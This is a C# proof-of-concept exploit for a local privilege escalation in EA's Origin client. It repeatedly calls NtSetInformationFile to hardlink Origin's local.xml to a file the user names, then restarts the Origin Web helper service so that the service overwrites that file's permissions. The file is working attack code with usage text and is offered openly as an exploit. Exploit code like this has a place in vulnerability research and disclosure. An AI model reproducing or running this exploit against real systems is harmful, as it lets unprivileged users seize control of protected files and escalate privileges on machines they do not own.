using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;

namespace MozServiceTest
{
    class Program
    {
        enum FILE_INFORMATION_CLASS
        {
            FileRenameInformation = 10,
            FileLinkInformation = 11,
            FileModeInformation = 16,
            FileObjectIdInformation = 29,
            FileShortNameInformation = 40,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct FILE_LINK_INFORMATION
        {
            [MarshalAs(UnmanagedType.U1)]
            public bool ReplaceIfExists;
            public IntPtr RootDirectory;
            public uint FileNameLength;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string FileName;
        }

        class IO_STATUS_BLOCK
        {
            public uint NtStatus;
            public IntPtr Dummy;
        };

        [DllImport("ntdll", ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern uint NtSetInformationFile(IntPtr FileHandle,
            IO_STATUS_BLOCK IoStatusBlock,
            IntPtr FileInformation,
            uint Length,
            FILE_INFORMATION_CLASS FileInformationClass);

        static void DoHardlinkThread(object target)
        {
            try
            {                
                FILE_LINK_INFORMATION f = new FILE_LINK_INFORMATION();
                f.FileName = @"\??\"+@"C:\ProgramData\Origin\local.xml";
                f.ReplaceIfExists = true;
                f.FileNameLength = (uint)(f.FileName.Length * 2);

                int size = Marshal.SizeOf(f);

                IntPtr p = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(f, p, false);

                using (FileStream fs = new FileStream(target.ToString(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    IntPtr h = fs.SafeFileHandle.DangerousGetHandle();
                    IO_STATUS_BLOCK status = new IO_STATUS_BLOCK();

                    while (NtSetInformationFile(h, status, p, (uint)size, FILE_INFORMATION_CLASS.FileLinkInformation) != 0)
                    {
                        status.NtStatus = 0;
                        status.Dummy = IntPtr.Zero;
                    }

                    Console.WriteLine("[+] EA's ORIGIN Client DACL Permission Overwrite LPE By @404death\n[+] Create Hardlink and Set Permission On Target File");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("HardLink Thread: {0}", ex);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[+] EA's ORIGIN Client DACL Permission Overwrite LPE By @404death\nUsage: Origin_DACL_EoP target_file");
                Environment.Exit(1);
            }

            Thread t = new Thread(DoHardlinkThread);
            t.IsBackground = true;
            t.Start(args[0]);

            Thread.Sleep(1000);

            try
            {
                ServiceController service = new ServiceController("Origin Web helper service");
       			try
       			{
       				if ((service.Status.Equals(ServiceControllerStatus.Running)) || (service.Status.Equals(ServiceControllerStatus.StartPending)))
       				{
       				service.Stop();
       				}
       				service.WaitForStatus(ServiceControllerStatus.Stopped);
       				service.Start();
       				service.WaitForStatus(ServiceControllerStatus.Running);
       				Console.WriteLine("[+] Restart The Service...\n[+] Check Permission on your target file");
       			}
       			catch
   				{
       				 Console.WriteLine("Test");
   				}

                t.Join(5000);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
